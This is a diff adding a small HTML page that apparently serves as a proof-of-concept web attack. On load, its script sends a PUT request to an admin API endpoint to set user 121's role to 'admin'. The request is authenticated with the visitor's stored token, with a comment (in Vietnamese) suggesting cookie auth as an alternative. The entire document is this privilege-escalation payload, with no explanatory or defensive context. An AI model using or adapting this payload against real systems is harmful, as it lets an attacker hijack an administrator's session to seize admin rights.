@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("/api/admin/users/121", {
+        method: "PUT",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer " + localStorage.getItem("token")  // Hoặc cookie nếu hệ thống dùng cookie auth
+        },
+        body: JSON.stringify({ role: "admin" })
+      });
+    </script>
+  </body>
+</html>
